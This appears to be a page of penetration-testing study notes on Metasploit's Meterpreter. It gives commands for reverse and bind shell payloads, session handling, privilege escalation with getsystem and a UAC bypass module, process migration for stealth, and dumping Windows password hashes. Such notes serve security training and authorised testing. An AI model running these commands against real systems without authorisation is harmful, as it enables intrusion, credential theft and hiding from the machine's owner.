# Meterpreter

Meterpreter is a very powerful shell which runs on Anroid, BSD, Java, Linux, PHP, Python, and Windows vulnerable applications and services

It provides advanced features to gather information, transfer files between the attacker and victim machines, install backdoors and more

To list all possible Meterpreter payloads in MSFConsole:

```
search meterpreter
```

To choose a payload when attacking a Windows machine:

```
set payload windows/meterpreter/reverse_tcp
```

## Bind and Reverse

Meterpreter can both wait for a connection on the target machine or connect back to the attacker machine

Most used configurations are `bind_tcp` and `reverse_tcp`

* **`bind_tcp`** runs a server process on the target machine that waits for connections from the attacker machine
* **`reverse_tcp`** performs a TCP connection back to the attacker machine which could help evade firewall rules

```
set payload windows/meterpreter/reverse_tcp
set payload linux/x86/meterpreter/reverse_tcp
set payload windows/meterpreter/bind_tcp
set payload java/meterpreter/bind_tcp
```

## Sessions

A single instance of MSFConsole can host multiple Meterpreter sessions which means you can instance multiple shells on your targets and switch between them

To switch from a Meterpreter session to the console

```
background
```

To list currently opened sessions

```
sessions -l
```

To resume a background session

```
sessions -i <id>
```

## Information Gathering

You can perform information gathering on the exploited machine and the network it is attached to

You can retrieve:

* Information about the machine and the OS
* The network configuration in use
* The routing table of the compromised host
* Information about the user running the exploited process

### System Information

To retrieve information about the exploited machine: name, OS, architecture, system language and the Meterpreter version running:

```
sysinfo
```

![](<../../../../.gitbook/assets/image (376).png>)

### Network configuration

To print the network configuration:

```
ifconfig
```

![](<../../../../.gitbook/assets/image (196).png>)

### Routing information

```
route
```

![](<../../../../.gitbook/assets/image (218).png>)

### Current User

```
getuid
```

![](<../../../../.gitbook/assets/image (92).png>)

### Privilege Escalation

To just current privileges on Windows

```
run post/windows/gather/win_privs
```

![](<../../../../.gitbook/assets/image (545).png>)

You can use `getsystem` if the owner of the process does not have high privileges on the victim system

```
getsystem
```

![](<../../../../.gitbook/assets/image (468).png>)

### Bypassing UAC

{% hint style="info" %}
In modern Windows operating systems, the User Account Control policy prevent privilege escalation
{% endhint %}

![](<../../../../.gitbook/assets/image (443).png>)

You can bypass that restriction by u sing the `bypassuac` module

```
use exploit/windows/local/bypassuac
```

Then you have to set the session where you want to bypass UAC

```
set session <id>
```

Launch the exploit to get a new Meterpreter session with the UAC policy disabled and use `getsystem`

![](<../../../../.gitbook/assets/image (6).png>)

## Staying Stealthy

Checking pid with `getpid` shows the process you're currently running on

As you can imagine, this process name is not very stealthy and is also suspicious

A user checking their process list may notice something strange on their machine

![](<../../../../.gitbook/assets/image (436).png>)

Therefore, in order to remain stealthy, we can use the `migrate` command to attach our session on a different process

We have to choose a process with the same privileges we currently have

```
ps -U SYSTEM
migrate <PID> //simply using migrate should work as well if you don't want to be specific
```

## Dumping the Password Database

```
use post/windows/gather/hashdump
set session <id>
exploit
```

![](<../../../../.gitbook/assets/image (410).png>)

## Exploring the Victim System

You can navigate the hard drive by using Unix-like shell commands

![](<../../../../.gitbook/assets/image (597).png>)

## Uploading and Downloading

![](<../../../../.gitbook/assets/image (352).png>)

## Running an OS Shell

You can run a standard OS shell

```
shell
```

![](<../../../../.gitbook/assets/image (114).png>)
